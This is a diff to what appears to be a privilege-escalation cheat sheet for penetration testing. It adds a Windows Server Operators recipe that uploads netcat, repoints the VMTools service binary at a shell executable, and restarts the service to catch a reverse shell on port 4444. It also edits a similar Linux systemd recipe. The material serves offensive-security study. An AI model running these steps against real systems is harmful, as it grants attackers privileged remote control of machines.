@@ -347,7 +347,7 @@ WantedBy=multi-user.target
 EOF 
 
 # 2. Set up a listener on the attacker machine
-# On attacker machine: nc -lvnp 4444
+# nc -lvnp 4444
 
 # 3. Enable the malicious service
 sudo systemctl enable ./root.service
@@ -403,9 +403,27 @@ chmod +x privesc.sh
 
 ### SeBackupPrivilege
 
-- [Windows Privilege Escalation: SeBackupPrivilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)
-- [Windows PrivEsc with SeBackupPrivilege](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960#5c26)
+> - [Windows Privilege Escalation: SeBackupPrivilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)
+> - [Windows PrivEsc with SeBackupPrivilege](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960#5c26)
 
+## Privileged Groups
+
+### Server Operators
+```bash
+# 1. Upload the netcat binary
+upload /usr/share/windows-binaries/nc.exe
+
+# 2. Replace the service binary
+sc.exe config VMTools binPath="C:\windows\system32\cmd.exe /c C:\Users\testuser\Documents\shell.exe"
+
+# 3. Set up a listener on the attacker machine
+# nc -lvnp 4444
+
+# 4. Restart the service to trigger the command execution
+sc.exe stop VMTools
+sc.exe start VMTools
+```
+> - [Windows Privilege Escalation: Server Operator Group](https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/)
 
 # Common Privilege Escalation Techniques
 
